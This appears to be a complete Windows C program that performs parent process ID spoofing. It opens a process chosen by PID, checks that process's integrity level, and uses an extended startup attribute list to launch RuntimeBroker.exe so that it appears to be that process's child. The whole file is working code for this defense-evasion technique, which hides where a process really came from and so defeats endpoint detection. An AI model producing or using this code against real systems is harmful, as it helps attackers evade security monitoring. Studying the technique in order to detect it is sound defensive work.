#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


BOOL isMediumIntegrityLevel(HANDLE processHandle) {
	BOOL result = FALSE;
	HANDLE tokenHandle = NULL;

	// Open the process token
	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle)) {
		printf("Failed to open process. Error code: %u\n", GetLastError());
		// Failed to open process token
		return FALSE;
	}

	// Get the integrity level of the process token
	DWORD tokenInfoLength = 0;
	GetTokenInformation(tokenHandle, TokenIntegrityLevel, NULL, 0, &tokenInfoLength);

	PTOKEN_MANDATORY_LABEL pTokenLabel = (PTOKEN_MANDATORY_LABEL)malloc(tokenInfoLength);
	if (pTokenLabel != NULL) {
		if (GetTokenInformation(tokenHandle, TokenIntegrityLevel, pTokenLabel, tokenInfoLength, &tokenInfoLength)) {
			DWORD integrityLevel = *GetSidSubAuthority(pTokenLabel->Label.Sid, *GetSidSubAuthorityCount(pTokenLabel->Label.Sid) - 1);

			// Medium Integrity Level is represented by SECURITY_MANDATORY_MEDIUM_RID (0x2000)
			if (integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID) {
				result = TRUE;
			}
		}

		free(pTokenLabel);
	}

	// Close the process token handle
	CloseHandle(tokenHandle);

	return result;
}



BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath[MAX_PATH * 2];
	CHAR                               WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sprintf_s(lpPath, sizeof(lpPath), "%s\\System32\\%s", WnDr, lpProcessName);


	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;


	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}


int main(int argc, char* argv[]) {

	if (argc != 2)
	{
		printf("Usage: %s <ParentID>\n", argv[0]);
		return 1;
	}

	DWORD processId = atoi(argv[1]);
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	if (!isMediumIntegrityLevel(processHandle)) {
		printf("[-] The Target Parent Process is elvated");
		return -1;
	}
	printf("[+] Spoofing (PID: %u) as the parent process.\n", processId);


	LPCSTR lpProcessName = "RuntimeBroker.exe";
	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL; 
	HANDLE hThread = NULL;

	if (!CreatePPidSpoofedProcess(processHandle, lpProcessName,&dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("Target Process Created with (PID: %u).\n", dwProcessId);


	printf("Press <Enter> to Exit");
	getchar();

	return 0;

}